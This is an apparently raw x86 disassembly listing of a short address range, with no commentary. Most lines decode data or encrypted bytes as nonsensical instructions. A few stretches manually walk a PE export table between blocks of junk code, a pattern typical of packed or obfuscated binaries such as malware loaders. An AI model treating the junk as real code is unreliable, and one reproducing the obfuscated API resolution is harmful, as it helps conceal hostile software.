  40ad4e:	les    eax,FWORD PTR fs:[edx+0x26]
  40ad52:	hlt    
  40ad53:	sub    eax,0xace11b29
  40ad58:	cmp    eax,0x25e3fe19
  40ad5d:	and    edi,DWORD PTR ds:0xd784b6b
  40ad63:	xchg   DWORD PTR [esi+0x46bfe28d],edi
  40ad69:	fdiv   QWORD PTR [eax+edx*2+0xfd2e6f4]
  40ad70:	sar    BYTE PTR [ebp+0x3edff9b2],0x2e
  40ad77:	add    DWORD PTR [edi+0x63a9caa1],edi
  40ad7d:	or     ah,bl
  40ad7f:	xor    esp,ebp
  40ad81:	mov    ds:0x7b89e839,al
  40ad86:	sbb    al,0x2b
  40ad88:	mov    BYTE PTR [ebp+0x50],dh
  40ad8b:	jns    0x40ad7f
  40ad8d:	xor    ch,BYTE PTR [edx+0x2ec8bafd]
  40ad93:	push   cs
  40ad94:	or     eax,0xabb21108
  40ad99:	in     al,dx
  40ad9a:	jb     0x40ad6c
  40ad9c:	call   0xf192:0xcca56a34
  40ada3:	popf   
  40ada4:	pop    esp
  40ada5:	int    0xb3
  40ada7:	das    
  40ada8:	and    al,BYTE PTR [ebp-0x7a1ef4e9]
  40adae:	xchg   ebp,eax
  40adaf:	xlat   BYTE PTR fs:[ebx]
  40adb1:	outs   dx,DWORD PTR gs:[esi]
  40adb3:	pushf  
  40adb4:	data16 fdivr QWORD PTR [edi+ebx*2+0x1c000ea2]
  40adbc:	addr16 dec ebx
  40adbe:	cmp    eax,edx
  40adc0:	clc    
  40adc1:	jb     0x40adb3
  40adc3:	jmp    0x1fb0:0xe8d4af1c
  40adca:	or     BYTE PTR [esi-0x4b],dl
  40adcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adce:	fiadd  DWORD PTR [ecx]
  40add0:	jmp    0x4bf27084
  40add5:	addr16 mov ebx,0x3cf53d9
  40addb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40addc:	jecxz  0x40add6
  40adde:	aad    0x18
  40ade0:	mov    ?,ecx
  40ade2:	ror    DWORD PTR [eax-0x11b97b3a],0x83
  40ade9:	mov    ss,WORD PTR [ecx-0x3b]
  40adec:	es loope 0x40adb2
  40adef:	xor    bh,ch
  40adf1:	test   DWORD PTR [esi+0x382ee366],edi
  40adf7:	pusha  
  40adf8:	jmp    0xf89eab1a
  40adfd:	or     BYTE PTR [esi],0x3f
  40ae00:	(bad)  
  40ae01:	rcr    DWORD PTR [esi-0x5],cl
  40ae04:	dec    esi
  40ae05:	ins    DWORD PTR es:[edi],dx
  40ae06:	or     BYTE PTR [ebp+0x7928016e],dh
  40ae0c:	push   esi
  40ae0d:	retf   
  40ae0e:	or     eax,0x98440e37
  40ae13:	mov    bl,bh
  40ae15:	adc    BYTE PTR [ebx-0xd58e534],ah
  40ae1b:	mov    DWORD PTR [edi+0x7318301a],esi
  40ae21:	scas   al,BYTE PTR es:[edi]
  40ae22:	mov    edi,0xce658ab8
  40ae27:	retf   
  40ae28:	mov    cl,0xef
  40ae2a:	fist   WORD PTR ds:0x168af653
  40ae30:	retf   0xecef
  40ae33:	out    dx,al
  40ae34:	call   0x2f77ce65
  40ae39:	in     eax,0x4
  40ae3b:	adc    BYTE PTR [edx+ebp*8+0x2bfe3583],bh
  40ae42:	mov    eax,0x4c7b8389
  40ae47:	push   edi
  40ae48:	fdivr  st,st(3)
  40ae4a:	mov    dl,0xee
  40ae4c:	out    dx,al
  40ae4d:	lock call 0x8c20:0xc9bf8aa9
  40ae55:	jb     0x40ae99
  40ae57:	addr16 popa 
  40ae59:	clc    
  40ae5a:	fadd   QWORD PTR [eax+0x7d]
  40ae5d:	jae    0x40ae48
  40ae5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae60:	cwde   
  40ae61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae62:	mov    bh,0x29
  40ae64:	ffree  st(3)
  40ae66:	cli    
  40ae67:	shl    BYTE PTR [ebx],0xf6
  40ae6a:	scas   eax,DWORD PTR es:[edi]
  40ae6b:	outs   dx,DWORD PTR ds:[esi]
  40ae6c:	inc    ebx
  40ae6d:	lods   al,BYTE PTR ds:[esi]
  40ae6e:	clc    
  40ae6f:	call   0xea128269
  40ae74:	push   0xe19693f4
  40ae79:	shl    BYTE PTR [edi],cl
  40ae7b:	push   0xe
  40ae7d:	lea    eax,[eax]
  40ae7f:	and    BYTE PTR [ebp-0x22],bl
  40ae82:	in     eax,0x53
  40ae84:	in     eax,dx
  40ae85:	dec    eax
  40ae86:	sub    eax,DWORD PTR [eax-0x275e4c95]
  40ae8c:	sti    
  40ae8d:	jecxz  0x40aed3
  40ae8f:	push   0xb1179017
  40ae94:	jge    0x40ae21
  40ae96:	cmc    
  40ae97:	jp     0x40aee9
  40ae99:	xchg   ebp,eax
  40ae9a:	or     BYTE PTR [esi+0x75],cl
  40ae9d:	hlt    
  40ae9e:	(bad)  [ebp+0x12ac4a6d]
  40aea4:	cmp    edx,edi
  40aea6:	inc    edx
  40aea7:	stos   BYTE PTR es:[edi],al
  40aea8:	add    eax,DWORD PTR [ebp-0x33ea41e5]
  40aeae:	or     esi,DWORD PTR ss:[esi+0xe]
  40aeb2:	xor    edi,edi
  40aeb4:	test   BYTE PTR [ecx],cl
  40aeb6:	int3   
  40aeb7:	push   cs
  40aeb8:	sti    
  40aeb9:	add    ah,BYTE PTR [esi]
  40aebb:	mov    esi,0xf8c96858
  40aec0:	xor    esi,ebx
  40aec2:	popa   
  40aec3:	cld    
  40aec4:	push   edi
  40aec5:	or     BYTE PTR [eax],0xff
  40aec8:	retf   0x13a1
  40aecb:	ins    DWORD PTR es:[edi],dx
  40aecc:	shr    BYTE PTR [eax],0x46
  40aecf:	pop    esp
  40aed0:	add    ch,bl
  40aed2:	inc    ebp
  40aed3:	(bad)  
  40aed4:	(bad)  [ecx]
  40aed6:	enter  0x6184,0xa1
  40aeda:	aas    
  40aedb:	scas   eax,DWORD PTR es:[edi]
  40aedc:	int    0xaa
  40aede:	cmp    eax,0x1ebf7431
  40aee3:	enter  0x8ad,0xf
  40aee7:	inc    esp
  40aee8:	in     al,dx
  40aee9:	out    dx,al
  40aeea:	sar    dl,cl
  40aeec:	xor    al,0x2c
  40aeee:	mov    edx,0x11d4ccbf
  40aef3:	stos   DWORD PTR es:[edi],eax
  40aef4:	cdq    
  40aef5:	sub    bh,BYTE PTR [ecx-0x3f]
  40aef8:	ins    DWORD PTR es:[edi],dx
  40aef9:	out    0x88,al
  40aefb:	in     al,dx
  40aefc:	add    DWORD PTR [ebx],0x69
  40aeff:	lock dec edx
  40af01:	enter  0x42c3,0x9a
  40af05:	loop   0x40ae91
  40af07:	aaa    
  40af08:	js     0x40af2f
  40af0a:	enter  0x46c7,0x15
  40af0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af0f:	pop    ss
  40af10:	jg     0x40af04
  40af12:	loope  0x40af08
  40af14:	(bad)  [ecx-0x7a4de0c8]
  40af1a:	jo     0x40af0b
  40af1c:	xor    esp,edx
  40af1e:	sub    bh,0x93
  40af21:	ins    DWORD PTR es:[edi],dx
  40af22:	(bad)  
  40af23:	mov    dh,0xe
  40af25:	lock mov edi,0x765e8cf4
  40af2b:	xchg   ebp,eax
  40af2c:	stos   BYTE PTR es:[edi],al
  40af2d:	bound  esp,QWORD PTR [edx+0x66]
  40af30:	ins    BYTE PTR es:[edi],dx
  40af31:	pop    edi
  40af32:	mov    cl,0x7c
  40af34:	hlt    
  40af35:	push   0x2a13052a
  40af3a:	dec    eax
  40af3b:	fmul   DWORD PTR gs:[edi]
  40af3e:	cwde   
  40af3f:	push   cs
  40af40:	pusha  
  40af41:	inc    eax
  40af42:	fisttp DWORD PTR [edi-0xd958a22]
  40af48:	or     ah,BYTE PTR [esi-0x26]
  40af4b:	stos   BYTE PTR es:[edi],al
  40af4c:	stos   BYTE PTR es:[edi],al
  40af4d:	xchg   DWORD PTR [ecx],ebp
  40af4f:	cmp    ecx,edx
  40af51:	fabs   
  40af53:	(bad)  
  40af54:	sbb    ch,BYTE PTR [edx]
  40af56:	retf   0x9af9
  40af59:	xor    ecx,DWORD PTR [esi-0x4cbd6d96]
  40af5f:	call   0xd2b485f1
  40af64:	in     eax,dx
  40af65:	jne    0x40af62
  40af67:	cmp    BYTE PTR ds:0xc7f3833d,bh
  40af6d:	pop    ebx
  40af6e:	fild   QWORD PTR [edx-0x16]
  40af71:	mov    eax,DWORD PTR [eax+0x18]
  40af74:	or     ecx,0x7018
  40af7a:	mov    DWORD PTR [ebp-0x20],eax
  40af7d:	mov    eax,DWORD PTR [ebp-0x14]
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4337a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43375f
  40af93:	sub    DWORD PTR ds:0x43370f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43375b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43375b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43375b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43375b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43375b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43375b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43375b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43375b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4337a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	inc    ecx
  40b018:	or     DWORD PTR [eax],0x7ef76427
  40b01e:	jle    0x40b058
  40b020:	jl     0x40b0a0
  40b022:	jle    0x40afbd
  40b024:	in     eax,0xb
  40b026:	cmp    WORD PTR ds:0xcb258d36,0x86f8
  40b02f:	mov    edx,0xfd02cb0d
  40b034:	div    BYTE PTR [eax]
  40b036:	mov    ds:0xfefc6a54,al
  40b03b:	fcmovnu st,st(1)
  40b03d:	out    dx,eax
  40b03e:	sub    BYTE PTR [ecx],ch
  40b040:	jmp    0xc728:0xb3383771
  40b047:	or     BYTE PTR gs:[edx-0x60],bh
  40b04b:	add    eax,0x94a5fe0c
  40b050:	hlt    
  40b051:	add    ecx,DWORD PTR [ebx]
  40b053:	xor    dl,BYTE PTR [eax+0x311aa50f]
  40b059:	push   esp
  40b05a:	pop    ebx
  40b05b:	xor    DWORD PTR ds:0xf54ca8e0,edi
  40b061:	adc    ah,BYTE PTR [edx+0x29]
  40b064:	push   ecx
  40b065:	das    
  40b066:	sub    eax,0x38f5d707
  40b06b:	sub    ebp,DWORD PTR [eax-0x64bb58e8]
  40b071:	ret    0xb3f7
  40b074:	push   cs
  40b075:	outs   dx,DWORD PTR ds:[esi]
  40b076:	add    eax,0x61c0d060
  40b07b:	mov    bh,0xd1
  40b07d:	sbb    dl,BYTE PTR [ebx]
  40b07f:	and    al,dh
  40b081:	loopne 0x40b029
  40b083:	mov    ah,0xe3
  40b085:	xchg   ebp,eax
  40b086:	outs   dx,DWORD PTR ds:[esi]
  40b087:	sbb    eax,0x452fbd30
  40b08c:	ins    DWORD PTR es:[edi],dx
  40b08d:	xor    esi,DWORD PTR [ebp*4-0x1d32d7a7]
  40b094:	adc    DWORD PTR [ebp-0x11],esp
  40b097:	repnz stos DWORD PTR es:[edi],eax
  40b099:	mov    cl,0xae
  40b09b:	int3   
  40b09c:	jno    0x40b04f
  40b09e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b09f:	rol    DWORD PTR [eax+edx*2],cl
  40b0a2:	retf   0x3a41
  40b0a5:	cmp    ah,BYTE PTR [eax-0x57]
  40b0a8:	repz jecxz 0x40b112
  40b0ab:	jge    0x40b030
  40b0ad:	fwait
  40b0ae:	ins    DWORD PTR es:[edi],dx
  40b0af:	mov    ch,BYTE PTR [ebx+eax*1]
  40b0b2:	sub    ebx,DWORD PTR [ebp-0xb1d8d97]
  40b0b8:	outs   dx,DWORD PTR ds:[esi]
  40b0b9:	mov    BYTE PTR [esi-0x13],0x6c
  40b0bd:	xor    DWORD PTR [esi-0x1437e290],esp
  40b0c3:	imul   ecx,edx,0xf
  40b0c6:	lock push esp
  40b0c8:	mov    DWORD PTR [ebx],ecx
  40b0ca:	jmp    0x19b3478
  40b0cf:	mov    edi,0xbf8e9a31
  40b0d4:	jmp    0x9282:0xc697bf6
  40b0db:	popf   
  40b0dc:	inc    ecx
  40b0dd:	mov    bl,0xd8
  40b0df:	and    BYTE PTR [ebp+0x1f],al
  40b0e2:	dec    edi
  40b0e3:	inc    eax
  40b0e4:	xchg   esi,eax
  40b0e5:	int    0x7
  40b0e7:	add    DWORD PTR [eax+0x34],0x56
  40b0eb:	pop    edi
  40b0ec:	retf   0x6f10
  40b0ef:	int    0x2
  40b0f1:	jg     0x40b07f
  40b0f3:	and    cl,bl
  40b0f5:	test   eax,0x2cb310a8
  40b0fa:	pop    ss
  40b0fb:	loope  0x40b129
  40b0fd:	cmp    eax,0xc19bf5ee
  40b102:	push   esi
  40b103:	sbb    ebx,esp
  40b105:	mov    esi,0xd4bc2d7e
  40b10a:	(bad)  
  40b10b:	push   ebp
  40b10c:	pop    edx
  40b10d:	sub    al,0x49
  40b10f:	adc    BYTE PTR [ebx+0x20],0xd7
  40b113:	enter  0xa359,0x6a
  40b117:	gs daa 
  40b119:	xchg   edi,eax
  40b11a:	pop    esi
  40b11b:	mov    cl,0x5f
  40b11d:	sti    
  40b11e:	push   ds
  40b11f:	and    eax,0x45ad1219
  40b124:	into   
  40b125:	hlt    
  40b126:	mov    WORD PTR [ecx],ds
  40b128:	shr    DWORD PTR [esi-0xd],cl
  40b12b:	xchg   esp,eax
  40b12c:	or     ah,BYTE PTR [edx]
  40b12e:	add    DWORD PTR [ecx],edx
  40b130:	push   es
  40b131:	mov    WORD PTR [eax],?
  40b133:	pushf  
  40b134:	es lock xchg esi,eax
  40b137:	ds pop esp
  40b139:	and    eax,0x9e8b107d
  40b13e:	adc    ch,BYTE PTR [edx+0x7d8e945d]
  40b144:	shl    DWORD PTR [edx-0x1c887141],0x74
  40b14b:	dec    edi
  40b14c:	mov    dh,0xed
  40b14e:	mov    dl,0x47
  40b150:	call   0x898df953
  40b155:	mov    esi,0x63dbeee1
  40b15a:	dec    ebp
  40b15b:	out    dx,al
  40b15c:	mov    BYTE PTR [ecx-0x18],dl
  40b15f:	popa   
  40b160:	push   esi
  40b161:	stos   BYTE PTR es:[edi],al
  40b162:	jmp    0x40b1de
  40b164:	pushf  
  40b165:	dec    edi
  40b166:	nop
  40b167:	mov    ds:0x5311401e,al
  40b16c:	les    eax,FWORD PTR [eax+0x19f96459]
  40b172:	mov    ebp,0x5440980d
  40b177:	dec    edx
  40b178:	push   edx
  40b179:	sets   cl
  40b17c:	pop    edx
  40b17d:	jle    0x40b152
  40b17f:	test   DWORD PTR cs:[ebp-0x65a1b4fd],0x60a8b30f
  40b18a:	push   eax
  40b18b:	xor    ch,bh
  40b18d:	pop    eax
  40b18e:	das    
  40b18f:	scas   al,BYTE PTR es:[edi]
  40b190:	or     cl,BYTE PTR [edi]
  40b192:	push   0x18
  40b194:	mov    esp,0x37062dd3
  40b199:	cld    
  40b19a:	aaa    
  40b19b:	jbe    0x40b217
  40b19d:	dec    esi
  40b19f:	aad    0xe0
  40b1a1:	aaa    
  40b1a2:	mov    edx,DWORD PTR [ebp-0x607c3f07]
  40b1a8:	xchg   esi,eax
  40b1a9:	dec    ecx
  40b1aa:	test   BYTE PTR [edx+0x44],bl
  40b1ad:	mov    cl,0xde
  40b1af:	aaa    
  40b1b0:	mov    al,0x82
  40b1b2:	sti    
  40b1b3:	call   0xd194bf36
  40b1b8:	inc    BYTE PTR [edx]
  40b1ba:	outs   dx,DWORD PTR ds:[esi]
  40b1bb:	mov    edi,0x1741abc8
  40b1c0:	push   es
  40b1c1:	inc    edi
  40b1c2:	call   0xa80ab619
  40b1c7:	fsub   QWORD PTR [ebx+0x7174cc5b]
  40b1cd:	scas   al,BYTE PTR es:[edi]
  40b1ce:	retf   
  40b1cf:	or     DWORD PTR [esi-0x2aceb982],edx
  40b1d5:	sub    BYTE PTR [ecx-0x1f2c3a55],bh
  40b1db:	ja     0x40b1f6
  40b1dd:	les    esp,FWORD PTR [eax-0x6b]
  40b1e0:	mov    esi,0xf8ad94fe
  40b1e5:	mov    edi,0x3401ffe4
  40b1ea:	mov    al,ds:0xb5907463
  40b1ef:	ins    DWORD PTR es:[edi],dx
  40b1f0:	pop    ss
  40b1f1:	xlat   BYTE PTR ds:[ebx]
  40b1f2:	push   ecx
  40b1f3:	stos   BYTE PTR es:[edi],al
  40b1f4:	add    eax,0x32095116
  40b1f9:	seta   dh
  40b1fc:	idiv   BYTE PTR [ecx]
  40b1fe:	scas   al,BYTE PTR es:[edi]
  40b1ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b200:	jmp    0x32574cc5
  40b205:	in     al,0x4d
  40b207:	mov    eax,0xd2b69628
  40b20c:	and    BYTE PTR [esi],ch
  40b20e:	nop
  40b20f:	in     eax,0x6d
  40b211:	jo     0x40b1e0
  40b213:	and    esp,DWORD PTR [edx+0x3feb642e]
  40b219:	lock jge 0x40b20d
  40b21c:	mov    DWORD PTR [edx-0x398c233e],eax
  40b222:	dec    esi
  40b223:	out    0xcd,eax
  40b225:	sub    BYTE PTR [ecx-0x11],bh
  40b228:	adc    al,0xa2
  40b22a:	ss ja  0x40b265
  40b22d:	sar    ebx,0x4f
  40b230:	test   dh,bh
  40b232:	dec    edi
  40b233:	add    al,0xd5
  40b235:	inc    esi
  40b236:	push   es
  40b237:	push   es
  40b238:	adc    DWORD PTR [esi*2-0x7b64c5d3],esi
  40b23f:	addr16 dec edx
  40b241:	mov    edi,0xf374c0ca
  40b246:	test   DWORD PTR [eax],esp
  40b248:	stos   DWORD PTR es:[edi],eax
  40b249:	dec    esi
  40b24a:	test   DWORD PTR [esi],0xeca8cb54
  40b250:	jle    0x40b243
  40b252:	sbb    BYTE PTR ds:[esi],dh
  40b255:	jl     0x40b1f4
  40b257:	mov    ebx,DWORD PTR [eax]
  40b259:	mov    ds:0x23b2f269,eax
  40b25e:	sbb    eax,0x69debcb2
  40b263:	sar    dl,1
  40b265:	out    dx,al
  40b266:	loopne 0x40b22c
  40b268:	ja     0x40b1f5
  40b26a:	inc    ebp
  40b26b:	in     al,dx
  40b26c:	mov    ecx,DWORD PTR [ebp+0x8]
  40b26f:	add    ecx,DWORD PTR [eax+0x24]
  40b272:	jmp    0x40b4d5
  40b277:	jno    0x40b206
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	ja     0x40b23d
  40b285:	jecxz  0x40b2a6
  40b287:	cs bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	mov    ch,0xe5
  40b291:	mov    ch,bh
  40b293:	daa    
  40b294:	dec    edi
  40b295:	sub    BYTE PTR [edi+ebx*4+0x50ead40a],ah
  40b29c:	retfw  
  40b29e:	lock adc ecx,edi
  40b2a1:	fs jno 0x40b31a
  40b2a4:	cmc    
  40b2a5:	jecxz  0x40b2ca
  40b2a7:	cld    
  40b2a8:	stos   WORD PTR es:[edi],ax
  40b2aa:	sbb    eax,0x6d21b8e6
  40b2af:	pop    ebx
  40b2b0:	pushf  
  40b2b1:	dec    ecx
  40b2b2:	(bad)  
  40b2b3:	jns    0x40b23b
  40b2b5:	fnsave [ebx+0x2]
  40b2b8:	or     DWORD PTR [ecx-0x35],ebx
  40b2bb:	imul   ebx,DWORD PTR [ecx+0x4c53bd74],0x1f
  40b2c2:	jo     0x40b299
  40b2c4:	jne    0x40b30e
  40b2c6:	dec    edi
  40b2c7:	mov    ds,WORD PTR [eax+0x1b8c176d]
  40b2cd:	fisub  DWORD PTR [eax]
  40b2cf:	xchg   ecx,eax
  40b2d0:	or     esp,DWORD PTR ds:0x9a45384d
  40b2d6:	mov    ah,BYTE PTR [eax]
  40b2d8:	into   
  40b2d9:	add    cl,dh
  40b2db:	xor    al,0x32
  40b2dd:	(bad)  
  40b2de:	hlt    
  40b2df:	add    al,0x95
  40b2e1:	adc    eax,0x98a556fc
  40b2e6:	ret    
  40b2e7:	mov    ebp,0x92fe5209
  40b2ec:	xchg   esp,eax
  40b2ed:	divps  xmm7,XMMWORD PTR [edi-0x7a]
  40b2f1:	lods   al,BYTE PTR ds:[esi]
  40b2f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2f3:	mov    ch,0x9f
  40b2f5:	sub    DWORD PTR [ebx],eax
  40b2f7:	aam    0xf2
  40b2f9:	iret   
  40b2fa:	in     eax,dx
  40b2fb:	mov    eax,es:0x402c52e3
  40b301:	mov    bh,0x14
  40b303:	mov    WORD PTR [ebx+edi*1],?
  40b306:	sub    BYTE PTR [eax],cl
  40b308:	sahf   
  40b309:	xor    ebx,0x391523ad
  40b30f:	shl    dl,0x35
  40b312:	xchg   cl,ch
  40b314:	or     eax,0x3183070c
  40b319:	mov    al,0xd3
  40b31b:	dec    ecx
  40b31c:	sar    DWORD PTR [edi+eax*1],0x6
  40b320:	mov    es,WORD PTR ds:[eax-0xe2abffa]
  40b327:	mov    cl,0x9c
  40b329:	mov    cl,0x61
  40b32b:	pop    ss
  40b32c:	adc    eax,0xf454527d
  40b331:	or     eax,0x7c80b36f
  40b336:	jno    0x40b3a1
  40b338:	fiadd  DWORD PTR [ecx+0x19aae00f]
  40b33e:	adc    edx,DWORD PTR [edi+0x36]
  40b341:	arpl   WORD PTR [eax-0x80],si
  40b344:	push   edi
  40b345:	xchg   ebp,eax
  40b346:	inc    edx
  40b347:	pop    ds
  40b348:	jecxz  0x40b37c
  40b34a:	jp     0x40b360
  40b34c:	jb     0x40b393
  40b34e:	ins    BYTE PTR es:[edi],dx
  40b34f:	ss jp  0x40b312
  40b352:	sub    ecx,0x5
  40b355:	popf   
  40b356:	fnstcw WORD PTR [edi]
  40b358:	or     ebp,DWORD PTR [esi]
  40b35a:	xchg   esp,eax
  40b35b:	or     BYTE PTR [ecx],bl
  40b35d:	sub    bh,BYTE PTR [eax-0x716cf309]
  40b363:	dec    esp
  40b364:	loope  0x40b362
  40b366:	mov    dl,0xf5
  40b368:	(bad)  
  40b369:	out    dx,eax
  40b36a:	test   al,0xe5
  40b36c:	xor    edx,DWORD PTR [esi+0x4e]
  40b36f:	pop    ebp
  40b370:	mov    ebp,0xb747706a
  40b375:	inc    edx
  40b376:	inc    esp
  40b377:	jb     0x40b39c
  40b379:	pop    ecx
  40b37a:	cmp    eax,0x2e08e92
  40b37f:	das    
  40b380:	cmp    eax,0xf95e86aa
  40b385:	and    eax,0x1846053d
  40b38a:	fdiv   DWORD PTR [eax]
  40b38c:	js     0x40b381
  40b38e:	push   ds
  40b38f:	test   eax,0x2569383d
  40b394:	test   eax,0x3a4b8fc6
  40b399:	in     al,dx
  40b39a:	jno    0x40b3d5
  40b39c:	jbe    0x40b325
  40b39e:	dec    esp
  40b39f:	adc    eax,0xe1a6f73
  40b3a4:	sub    dh,cl
  40b3a6:	mov    ch,0x12
  40b3a8:	mov    dl,0x66
  40b3aa:	in     eax,0x3
  40b3ac:	fild   QWORD PTR [edx+0x29]
  40b3af:	bound  edi,QWORD PTR [edx]
  40b3b1:	add    al,0x69
  40b3b3:	or     dl,BYTE PTR [ecx+0x69]
  40b3b6:	sbb    BYTE PTR [ebx],ch
  40b3b8:	add    ch,BYTE PTR [ebx+0x4fe84740]
  40b3be:	xchg   ebp,eax
  40b3bf:	push   esp
  40b3c0:	or     al,0x3
  40b3c2:	cs dec ebx
  40b3c4:	lahf   
  40b3c5:	xor    eax,0x38b02864
  40b3ca:	scas   al,BYTE PTR es:[edi]
  40b3cb:	(bad)  
  40b3cd:	sub    al,0x9f
  40b3cf:	in     al,dx
  40b3d0:	inc    BYTE PTR [ecx]
  40b3d2:	fisub  DWORD PTR [edi+edi*1]
  40b3d5:	dec    esi
  40b3d6:	pop    ds
  40b3d7:	out    dx,eax
  40b3d8:	or     BYTE PTR ds:0xb35ca3df,al
  40b3de:	sar    BYTE PTR [ebp-0x21],0x81
  40b3e2:	jo     0x40b3d9
  40b3e4:	loope  0x40b43c
  40b3e6:	scas   eax,DWORD PTR es:[edi]
  40b3e7:	dec    edx
  40b3e8:	pop    ss
  40b3e9:	add    ecx,ecx
  40b3eb:	jl     0x40b3b7
  40b3ed:	cmp    eax,0x8480f20d
  40b3f2:	addr16 pushf 
  40b3f4:	ins    BYTE PTR es:[edi],dx
  40b3f5:	in     al,dx
  40b3f6:	add    BYTE PTR [eax-0x11],dh
  40b3f9:	je     0x40b45d
  40b3fb:	push   ebx
  40b3fc:	aas    
  40b3fd:	les    ebx,FWORD PTR [edi]
  40b3ff:	outs   dx,BYTE PTR ds:[esi]
  40b400:	ja     0x40b43f
  40b402:	pop    esp
  40b403:	(bad)  
  40b404:	icebp  
  40b405:	jle    0x40b409
  40b407:	(bad)  
  40b408:	pop    edi
  40b409:	xor    edx,DWORD PTR [ecx]
  40b40b:	mov    edx,0xfe9f73d8
  40b410:	out    dx,al
  40b411:	les    esp,FWORD PTR [edx]
  40b413:	and    BYTE PTR [ebp-0x20],ch
  40b416:	jnp    0x40b3dc
  40b418:	pop    ecx
  40b419:	cmp    al,0xb5
  40b41b:	out    dx,al
  40b41c:	pop    esi
  40b41d:	and    DWORD PTR [ecx+ebx*1-0x41],esi
  40b421:	in     al,dx
  40b422:	cli    
  40b423:	enter  0x50de,0x69
  40b427:	xor    eax,0x2ddc040f
  40b42c:	jge    0x40b45e
  40b42e:	adc    dl,BYTE PTR [ecx]
  40b430:	add    BYTE PTR [esi+esi*2-0x42],al
  40b434:	into   
  40b435:	pop    edi
  40b436:	lock xor al,0x10
  40b439:	ror    BYTE PTR [eax-0x3a0f4f0f],1
  40b43f:	cmp    eax,0xf5cb97ba
  40b444:	adc    ecx,DWORD PTR [edx-0x424b7383]
  40b44a:	xchg   esp,eax
  40b44b:	cmc    
  40b44c:	lock sbb bl,cl
  40b44f:	adc    dl,dh
  40b451:	dec    ebx
  40b452:	or     al,0x0
  40b454:	hlt    
  40b455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b456:	jno    0x40b4b1
  40b458:	sbb    edx,0x8f4aa32a
  40b45e:	dec    edx
  40b45f:	je     0x40b42b
  40b461:	and    eax,DWORD PTR [ecx+ebx*4+0x28]
  40b465:	neg    edi
  40b467:	push   esi
  40b468:	and    esp,DWORD PTR [ebx]
  40b46a:	jbe    0x40b426
  40b46c:	(bad)  
  40b46d:	xchg   ebp,eax
  40b46e:	enter  0x73ef,0x28
  40b472:	cdq    
  40b473:	jp     0x40b4af
  40b475:	into   
  40b476:	or     DWORD PTR [edx+0x67],ecx
  40b479:	mov    edx,0x23363f9d
  40b47e:	nop
  40b47f:	rcl    ebp,0x6d
  40b482:	mov    eax,0xbc371e6b
  40b487:	xchg   esi,eax
  40b488:	push   ebp
  40b489:	sbb    al,0xa7
  40b48b:	sub    ah,BYTE PTR [eax]
  40b48d:	pop    ecx
  40b48e:	adc    BYTE PTR [ecx],dh
  40b490:	jmp    0xcffa:0x3f5df428
  40b497:	stos   DWORD PTR es:[edi],eax
  40b498:	pop    ds
  40b499:	inc    edi
  40b49a:	mov    eax,ds:0x724f9561
  40b49f:	add    BYTE PTR [edx+ecx*4],al
  40b4a2:	leave  
  40b4a3:	and    BYTE PTR ds:0x21b76518,0xfa
  40b4aa:	push   eax
  40b4ab:	cld    
  40b4ac:	call   0x9050aa5e
  40b4b1:	(bad)  
  40b4b2:	push   edx
  40b4b3:	adc    DWORD PTR [esi],esp
  40b4b5:	sub    al,0x9
  40b4b7:	stos   DWORD PTR es:[edi],eax
  40b4b8:	cmp    BYTE PTR [eax+0x4cc9538c],al
  40b4be:	cdq    
  40b4bf:	pop    eax
  40b4c0:	and    ah,BYTE PTR [ecx]
  40b4c2:	and    eax,0xcf4a29f4
  40b4c7:	xor    bh,BYTE PTR [edx-0x7b]
  40b4ca:	nop
  40b4cb:	std    
  40b4cc:	ds push ebp
  40b4ce:	sbb    al,0x69
  40b4d0:	lahf   
  40b4d1:	xchg   ebx,edx
  40b4d3:	xchg   BYTE PTR [edi-0x742bb277],dh
  40b4d9:	inc    ebp
  40b4da:	in     al,dx
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	rcl    DWORD PTR [eax],cl
